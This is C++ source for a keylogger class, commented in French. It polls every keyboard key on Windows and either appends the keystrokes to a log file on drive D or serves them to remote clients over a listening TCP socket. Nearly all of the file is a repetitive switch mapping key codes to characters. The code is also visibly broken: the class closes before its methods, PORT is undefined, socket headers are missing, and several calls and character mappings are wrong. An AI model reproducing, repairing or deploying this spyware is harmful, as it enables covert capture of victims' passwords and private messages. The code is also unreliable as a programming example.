#include <iostream>
#include <windows.h>
#include <fstream>
#include <string.h>
#include <unistd.h>

#define FICHIER_SAUVEGARDE "D:\\log.txt"

using namespace std;

class Keylogger {
private:
	char touche_clavier;
	bool reseau;
	string symbole;

public:
	Keylogger(bool p_reseau) {
		Sleep(100);
		this->reseau = p_reseau;
		this->symbole = "";
		this->touche_clavier = '';
		this->Start();
	}
}
/**
 * Va sauvegarder le paramettre texte dans
 */
void Save() {
	ofstream writter;
	writter.open(FICHIER_SAUVEGARDE, ofstream::app);
	writter << this->symbole;
	writter.close();
}

/**
 * Symbolise l'id d'une touche (utile pour les touches speciales comme les clics de la souris, touche espace, etc)
 */
void Traitement(int p_id_touche_clavier) {
	switch (p_id_touche_clavier) {
	case 1:
		//this->symbole = "[clic gauche]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 2:
		//this->symbole = "[clic droit]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 8:
		this->symbole = "[SUPP]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 13:
		this->symbole = "[entree]\n";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 32:
		this->symbole = " ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 37:
		this->symbole = "[<-]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 38:
		this->symbole = "[<|]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 39:
		this->symbole = "[->]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 40:
		this->symbole = "[|>]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 48:
		this->symbole = "0";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 49:
		this->symbole = "1";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 50:
		this->symbole = "2";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 51:
		this->symbole = "3";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 52:
		this->symbole = "4";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 53:
		this->symbole = "5";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 54:
		this->symbole = "6";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 55:
		this->symbole = "7";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 56:
		this->symbole = "8";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 57:
		this->symbole = "9";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 58:
		this->symbole = ":";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 59:
		this->symbole = ";";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 60:
		this->symbole = "<";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 61:
		this->symbole = "=";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 62:
		this->symbole = ">";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 63:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 64:
		this->symbole = "@";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 65:
		this->symbole = "A";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 66:
		this->symbole = "B";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 67:
		this->symbole = "C";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 68:
		this->symbole = "D";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 69:
		this->symbole = "E";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 70:
		this->symbole = "F";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 71:
		this->symbole = "G";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 72:
		this->symbole = "H";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 73:
		this->symbole = "I";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 74:
		this->symbole = "J";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 75:
		this->symbole = "K";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 76:
		this->symbole = "L";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 77:
		this->symbole = "M";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 78:
		this->symbole = "N";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 79:
		this->symbole = "O";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 80:
		this->symbole = "P";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 81:
		this->symbole = "Q";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 82:
		this->symbole = "R";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 83:
		this->symbole = "S";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 84:
		this->symbole = "T";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 85:
		this->symbole = "U";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 86:
		this->symbole = "V";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 87:
		this->symbole = "W";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 88:
		this->symbole = "X";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 89:
		this->symbole = "Y";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 90:
		this->symbole = "Z";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 91:
		this->symbole = "[";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 92:
		this->symbole = "\"";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 93:
		this->symbole = "]";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 94:
		this->symbole = "^";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 95:
		this->symbole = "_";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 96:
		this->symbole = "`";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 97:
		this->symbole = "a";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 98:
		this->symbole = "b";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 99:
		this->symbole = "c";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 100:
		this->symbole = "d";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 101:
		this->symbole = "e";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 102:
		this->symbole = "f";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 103:
		this->symbole = "g";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 104:
		this->symbole = "h";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 105:
		this->symbole = "i";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 106:
		this->symbole = "j";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 107:
		this->symbole = "k";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 108:
		this->symbole = "l";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 109:
		this->symbole = "m";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 110:
		this->symbole = "n";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 111:
		this->symbole = "o";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 112:
		this->symbole = "p";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 113:
		this->symbole = "q";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 114:
		this->symbole = "r";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 115:
		this->symbole = "s";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 116:
		this->symbole = "t";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 117:
		this->symbole = "u";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 118:
		this->symbole = "v";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 119:
		this->symbole = "w";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 120:
		this->symbole = "x";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 121:
		this->symbole = "y";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 122:
		this->symbole = "z";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 123:
		this->symbole = "{";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 124:
		this->symbole = "|";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 125:
		this->symbole = "}";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 126:
		this->symbole = "~";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 127:
		this->symbole = "";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 128:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 129:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 130:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 131:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 132:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 133:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 134:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 135:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 136:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 137:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 138:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 139:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 140:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 141:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 142:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 143:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 144:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 145:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 146:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 147:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 148:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 149:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 150:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 151:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 152:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 153:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 154:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 155:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 156:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 157:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 158:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 159:
		this->symbole = "?";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 160:
		this->symbole = " ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 161:
		this->symbole = "¡";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 162:
		this->symbole = "¢";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 163:
		this->symbole = "£";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 164:
		this->symbole = "¤";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 165:
		this->symbole = "¥";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 166:
		this->symbole = "¦";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 167:
		this->symbole = "§";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 168:
		this->symbole = "¨";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 169:
		this->symbole = "©";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 170:
		this->symbole = "ª";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 171:
		this->symbole = "«";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 172:
		this->symbole = "¬";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 173:
		this->symbole = "­";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 174:
		this->symbole = "®";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 175:
		this->symbole = "¯";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 176:
		this->symbole = "°";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 177:
		this->symbole = "±";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 178:
		this->symbole = "²";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 179:
		this->symbole = "³";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 180:
		this->symbole = "´";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 181:
		this->symbole = "µ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 182:
		this->symbole = "¶";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 183:
		this->symbole = "·";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 184:
		this->symbole = "¸";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 185:
		this->symbole = "¹";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 186:
		this->symbole = "º";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 187:
		this->symbole = "»";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 188:
		this->symbole = "¼";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 189:
		this->symbole = "½";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 190:
		this->symbole = "¾";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 191:
		this->symbole = "¿";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 192:
		this->symbole = "À";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 193:
		this->symbole = "Á";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 194:
		this->symbole = "Â";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 195:
		this->symbole = "Ã";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 196:
		this->symbole = "Ä";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 197:
		this->symbole = "Å";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 198:
		this->symbole = "Æ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 199:
		this->symbole = "Ç";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 200:
		this->symbole = "È";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 201:
		this->symbole = "É";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 202:
		this->symbole = "Ê";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 203:
		this->symbole = "Ë";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 204:
		this->symbole = "Ì";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 205:
		this->symbole = "Í";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 206:
		this->symbole = "Î";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 207:
		this->symbole = "Ï";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 208:
		this->symbole = "Ð";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 209:
		this->symbole = "Ñ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 210:
		this->symbole = "Ò";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 211:
		this->symbole = "Ó";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 212:
		this->symbole = "Ô";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 213:
		this->symbole = "Õ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 214:
		this->symbole = "Ö";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 215:
		this->symbole = "×";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 216:
		this->symbole = "Ø";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 217:
		this->symbole = "Ù";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 218:
		this->symbole = "Ú";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 219:
		this->symbole = "Û";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 220:
		this->symbole = "Ü";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 221:
		this->symbole = "Ý";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 222:
		this->symbole = "Þ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 223:
		this->symbole = "ß";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 224:
		this->symbole = "à";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 225:
		this->symbole = "á";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 226:
		this->symbole = "â";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 227:
		this->symbole = "ã";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 228:
		this->symbole = "ä";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 229:
		this->symbole = "å";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 230:
		this->symbole = "æ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 231:
		this->symbole = "ç";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 232:
		this->symbole = "è";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 233:
		this->symbole = "é";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 234:
		this->symbole = "ê";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 235:
		this->symbole = "ë";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 236:
		this->symbole = "ì";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 237:
		this->symbole = "í";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 238:
		this->symbole = "î";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 239:
		this->symbole = "ï";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 240:
		this->symbole = "ð";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 241:
		this->symbole = "ñ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 242:
		this->symbole = "ò";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 243:
		this->symbole = "ó";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 244:
		this->symbole = "ô";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 245:
		this->symbole = "õ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 246:
		this->symbole = "ö";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 247:
		this->symbole = "÷";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 248:
		this->symbole = "ø";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 249:
		this->symbole = "ù";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 250:
		this->symbole = "ú";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 251:
		this->symbole = "û";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 252:
		this->symbole = "ü";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 253:
		this->symbole = "ý";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 254:
		this->symbole = "þ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	case 255:
		this->symbole = "ÿ";
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	default:
		if (this->reseau == true) {
			this->Envoyer();
		} else {
			this->Save();
		}
		break;
	}
}
void Envoyer() {
	int socket_server = 0; //Socket utiliser pour attendre une connexion, il est a la disposition des clients
	int socket_versleclient = 0; //Socket qui sera créer et utiliser si on accept la demande de connexion d'un client
	struct sockaddr_in serv_addr;
	char sendBuff[1025];
	int numrv;
	socket_server = socket(AF_INET, SOCK_STREAM, 0); //On créer le socket qui va être disponible pour les clients
	memset(&serv_addr, '0', sizeof(serv_addr));
	memset(sendBuff, '0', sizeof(sendBuff));
	serv_addr.sin_family = AF_INET; //On donne une famille au socket
	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); //
	serv_addr.sin_port = htons(PORT); ////htons "cast" le PORT pour qu'il soit lisible par le socket
	bind(socket_server, (struct sockaddr*) &serv_addr, sizeof(serv_addr)); //Nommage du socket, on lui donne un port
	listen(socket_server, 10); //Le socket se met en attente de la connection d'un client
	socket_versleclient = accept(socket_server, (struct sockaddr*) NULL,
	NULL); //Si il y a une connection, on l'accepte
	strcpy(sendBuff, this->touche_clavier);
	write(socket_versleclient, sendBuff, strlen(sendBuff)); //On écrit dans le socket en lien avec le client, et on lui envoie le message
	close(socket_versleclient);
}

void Start() {
	char touche_clavier;
	while (true) {
		for (touche_clavier = 1; touche_clavier <= 255; touche_clavier++) { //Pour toute les touches du clavier
			if (GetAsyncKeyState(touche_clavier) == -32767) { //Si une touche est saisie
				Traitement(touche_clavier);
			}
		}
	}
}
